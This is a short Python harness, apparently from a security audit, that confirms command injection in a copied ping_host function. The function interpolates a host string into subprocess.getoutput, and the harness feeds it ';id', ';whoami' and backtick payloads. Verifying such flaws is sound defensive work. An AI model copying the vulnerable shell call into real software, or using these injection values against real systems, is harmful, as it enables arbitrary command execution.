"""Harness: Verify command injection in ping_host via subprocess.getoutput.

This harness extracts the exact vulnerable function from src/board/engine.py:77-79
and tests it with benign and malicious payloads to confirm shell metacharacter injection.
"""
import subprocess


# Exact copy of the vulnerable function from src/board/engine.py:77-79
def ping_host(host: str) -> str:
    # Host is interpolated into a shell command and the output is returned.
    return subprocess.getoutput(f"echo MEMO-PING {host}")


def main():
    # Test 1: Benign input — normal behaviour
    r1 = ping_host("127.0.0.1")
    print(f"[Benign]  host=127.0.0.1  →  {r1!r}")

    # Test 2: Semicolon injection — classic command injection
    r2 = ping_host(";id")
    print(f"[Inject]  host=;id        →  {r2!r}")

    # Test 3: Semicolon + whoami
    r3 = ping_host(";whoami")
    print(f"[Inject]  host=;whoami   →  {r3!r}")

    # Test 4: Backtick injection variant
    r4 = ping_host("`whoami`")
    print(f"[Inject]  host=`whoami`  →  {r4!r}")

    # Verify command injection succeeded
    success = False
    for label, result in [(";id", r2), (";whoami", r3), ("`whoami`", r4)]:
        lines = [l for l in result.strip().split("\n") if l.strip()]
        if len(lines) > 1 or (len(lines) == 1 and "MEMO-PING" not in lines[0]):
            if "uid=" in result or (result.strip() and "whoami" not in result):
                success = True
                print(f"\n[+] Command injection CONFIRMED with payload '{label}'")
                print(f"    Response contains injected command output: {result!r}")
                break

    if not success:
        if "uid=" in r2 or "uid=" in r3:
            success = True
            print(f"\n[+] Command injection CONFIRMED — uid= found in response")

    if success:
        print("\n=== VULNERABILITY CONFIRMED: subprocess.getoutput(f\"echo MEMO-PING {host}\") allows command injection ===")
    else:
        print("\n=== NOT CONFIRMED ===")
        print(f"r2 = {r2!r}")
        print(f"r3 = {r3!r}")


if __name__ == "__main__":
    main()
